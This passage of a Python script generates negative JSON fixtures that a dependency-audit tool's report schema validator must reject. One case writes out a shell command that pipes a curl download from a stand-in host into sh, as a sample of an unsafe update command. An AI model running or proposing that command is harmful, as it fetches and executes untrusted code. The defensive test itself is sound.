def _(d): d['findings'][c_]['evidence'] = ''
@case('a3-installed-php-missing', 'composite', fc)
def _(d): del d['findings'][c_]['installed_php']
@case('a3-if-counted-modifiers-missing', 'psr-log', 'findings[0].score')
def _(d): del d['findings'][0]['score']['accepted'][0]['if_counted']['modifiers']
@case('a3-run-flags-not-flag-ids', 'composite', 'run')
def _(d): d['run']['flags'] = d['run'].pop('flag_ids')  # a list of bare flag ids is `flag_ids`

@case('a3-accepted-flag-not-fired', 'psr-log', 'findings[0]')
def _(d): d['findings'][0]['score']['accepted'].append(dict(flag='stale', weight=8, if_counted=dict(total=4, verdict='low', role='corroborating', at_least=False, modifiers=[])))
@case('a3-flag-signal-ids-not-its-signals', 'composite', fc + '.flags[0]')
def _(d): d['findings'][c_]['flags'][0]['signal_ids'] = ['S9']
@case('a3-graded-score-without-terms', 'composite', 'findings[%d].score' % e_)
def _(d): d['findings'][e_]['score']['terms'] = []
@case('a3-divide-by-1-under-model-1', 'composite', 'findings[%d].score' % POLY)
def _(d): d['findings'][POLY]['score']['modifiers'][0]['divide_by'] = 1
@case('a3-metadata-read-with-a-reason', 'composite', fc)
def _(d): d['findings'][c_]['metadata']['reason'] = 'offline'
@case('a3-metadata-unavailable-without-a-reason', 'composite', fc)
def _(d):
    d['findings'][c_]['maintenance_judged'] = False
    d['findings'][c_]['metadata'].update(status='unavailable', reason=None)

# ---------------------------------------------------------------------------------------------- attack round 4 (10.S1)
# each plants one rule the round-4 schema lens found accepted (published and strict) although a field description or the spec states it
tw, fo_ = TWIG, 'findings[%d]' % TWIG
WHOLE = dict(by='project', pattern='symfony/debug', version=None, reason='kept on purpose', reason_id=None, reason_by='user', expires=None, flag_ids=None)
@case('a4-evidence-on-a-score-0-finding', 'ok-unchecked', 'findings[0]')
def _(d): d['findings'][0]['evidence'] = 'stale: x'
@case('a4-whole-entry-beside-a-counted-maintenance-term', 'composite', fc)
def _(d): d['findings'][c_].update(allowlist=dict(WHOLE), allowlist_reason='kept on purpose')
@case('a4-quiet-years-on-a-require-move', 'composite', f + '.next_step')
def _(d): d['findings'][m]['next_step']['quiet_years'] = 3.2
@case('a4-version-on-a-blocked-move', 'A-blocked-dagger', 'findings[0].next_step')
def _(d): d['findings'][0]['next_step']['version'] = 'v3.0.0'
@case('a4-to-branch-on-a-no-move', 'stale-only', 'findings[0].next_step')
def _(d): d['findings'][0]['next_step']['to_branch'] = '2.x'
@case('a4-clears-on-a-no-move', 'stale-only', 'findings[0].next_step')
def _(d): d['findings'][0]['next_step']['clears'] = [dict(kind='flag', id='stale', basis='branch_releasing')]
@case('a4-command-on-a-transitive-require', 'routing', 'findings[0]')
def _(d): d['findings'][0]['next_step']['commands'] = [['composer', 'require', d['findings'][0]['package'] + ':^5.4']]
@case('a4-fix-kind-without-an-advisory', 'composite', fc)
def _(d): d['findings'][c_]['next_step']['fix_kind'] = 'update'
@case('a4-php-check-allows-without-requires', 'composite', fo_ + '.next_step')
def _(d): d['findings'][tw]['next_step']['php_check'].update(requires=None, project_allows=True)
@case('a4-installed-php-allows-without-requires', 'composite', fc)
def _(d): d['findings'][c_]['installed_php'].update(requires=None, project_allows=True)
@case('a4-raise-to-without-raise-size', 'composite', fo_ + '.next_step')
def _(d): d['findings'][tw]['next_step']['php_check']['raise_size'] = None
@case('a4-raise-size-without-raise-to', 'composite', fo_ + '.next_step')
def _(d): d['findings'][tw]['next_step']['php_check']['raise_to'] = None
@case('a4-held-by-root-names-a-package', 'composite', fo_ + '.next_step.held_by[0]')
def _(d): d['findings'][tw]['next_step']['held_by'][0]['package'] = 'acme/x'
@case('a4-held-by-root-with-a-holder', 'composite', fo_ + '.next_step.held_by[0]')
def _(d): d['findings'][tw]['next_step']['held_by'][0]['holder'] = copy.deepcopy(d['findings'][tw]['next_step']['held_by'][1]['holder'])
@case('a4-held-by-package-without-a-package', 'composite', fo_ + '.next_step.held_by[1]')
def _(d): d['findings'][tw]['next_step']['held_by'][1]['package'] = None
@case('a4-if-counted-at-least-on-left-behind', 'psr-log', 'findings[0]')
def _(d): d['findings'][0]['score']['accepted'][0]['if_counted']['at_least'] = True
@case('a4-without-advisory-row-at-least', 'composite', fo_ + '.score')
def _(d): d['findings'][tw]['score']['without'][0]['at_least'] = True
@case('a4-accepted-weight-99', 'psr-log', 'findings[0]')
def _(d): d['findings'][0]['score']['accepted'][0]['weight'] = 99
@case('a4-s9-row-points-7', 'composite', fo_)
def _(d): sig(d['findings'][tw], 'S9')['data']['advisories'][0]['points'] = 7
@case('a4-read-snapshot-without-the-release-branch-skip', 'composite', 'findings[%d]' % OAUTH)
def _(d): d['findings'][OAUTH]['checks_skipped'] = [c for c in d['findings'][OAUTH]['checks_skipped'] if c['check'] != 'release_branch']
@case('a4-headline-null-value-with-a-source', 'composite', f + '.flags[0]')
def _(d): d['findings'][m]['flags'][0]['headline'].update(value=None, source='branch')
@case('a4-update-now-command-null-beside-update-now', 'composite', 'security')
def _(d): d['security']['update_now_command'] = None
@case('a4-update-now-command-without-update-now', 'composite', 'security')
def _(d): d['security']['update_now'] = []
@case('a4-update-now-command-a-shell-pipe', 'composite', 'security.update_now_command')
def _(d): d['security']['update_now_command'] = ['sh', '-c', 'curl https://example.invalid/x | sh']
@case('a4-update-now-command-composer-remove', 'composite', 'security.update_now_command')
def _(d): d['security']['update_now_command'] = ['composer', 'remove', 'symfony/yaml']
@case('a4-cache-age-without-oldest', 'composite', '(root)')
def _(d): d['activity_cache_oldest_at'] = None
@case('a4-cache-oldest-without-age', 'composite', '(root)')
def _(d): d['activity_cache_age_hours'] = None
@case('a4-project-lowest-without-project-php', 'composite', 'run')
def _(d): d['run']['project_php_lowest'] = '7.2.0'
@case('a4-run-verdicts-reversed', 'composite', 'run')
def _(d): d['run']['verdicts'] = list(reversed(d['run']['verdicts']))
@case('a4-run-verdicts-without-ok', 'composite', 'run')
def _(d): d['run']['verdicts'] = d['run']['verdicts'][:-1]
@case('a4-run-flag-ids-vulnerable-only', 'composite', 'run')
def _(d): d['run']['flag_ids'] = ['vulnerable']
@case('a4-run-signal-ids-two', 'composite', 'run')
def _(d): d['run']['signal_ids'] = ['S1', 'S2']
@case('a4-fail-on-none-beside-a-grade', 'composite', 'run')
def _(d): d['run']['fail_on'] = 'high,none'
@case('a4-gate-threshold-not-its-value', 'composite', 'run.gates[0]')
def _(d): d['run']['gates'][0]['threshold'] = 'critical'
@case('a4-target-php-with-a-patch', 'composite', 'run.target_php')
def _(d): d['run']['target_php'] = '8.4.7'
@case('a4-project-lowest-four-segments', 'A', 'run.project_php_lowest')
def _(d): d['run']['project_php_lowest'] = '7.2.0.0'
@case('a4-forge-null', 'composite', fc)
def _(d): sig(d['findings'][c_], 'S3')['data']['forge'] = None


# ---------------------------------------------------------------------------------------------- 0.14 sync (2026-10-03): the item fields and Q2
# Q2: every recorded entry comes from a baseline-2 file, so its dates, target and fix model are never null
@case('q2-recorded-target-php-null', 'B-baselined-dagger', 'findings[0].baseline')
def _(d): d['findings'][0]['baseline']['recorded']['target_php'] = None
@case('q2-recorded-fix-model-null', 'B-baselined-dagger', 'findings[0].baseline')
def _(d): d['findings'][0]['baseline']['recorded']['fix_model'] = None
@case('q2-recorded-known-since-null', 'B-baselined-dagger', 'findings[0].baseline')
def _(d): d['findings'][0]['baseline']['recorded']['flags']['left-behind']['known_since'] = None
@case('q2-note-baseline-knows-no-advisories.strict', 'composite', 'note_details[0]', strict=True)
def _(d):
    n = dict(code='baseline_knows_no_advisories', text='t', docs_url='https://lockrot.dev/notes/#baseline_knows_no_advisories', sets_network_failures=False,
             data=dict(baseline_schema=1, entry_count=1, packages=1, advisories_not_known=1))
    d['note_details'].append(n); d['notes'].append('t')


if __name__ == '__main__':
    os.makedirs(OUT, exist_ok=True)
    for old in glob.glob(os.path.join(OUT, '*.json')):
        os.remove(old)
    cache = {}
    for i, (name, base, fn, err, strict) in enumerate(CASES, 1):
        if base not in cache:
            cache[base] = load(base)
        d = copy.deepcopy(cache[base])
        fn(d)
        d = {'$expect': {'strict': strict, 'error': err}, **d}
        with open(os.path.join(OUT, '%02d-%s.json' % (i, name)), 'w') as fh:
            json.dump(d, fh, indent=1, ensure_ascii=False)
    print(f'{len(CASES)} negative fixtures in {OUT}')
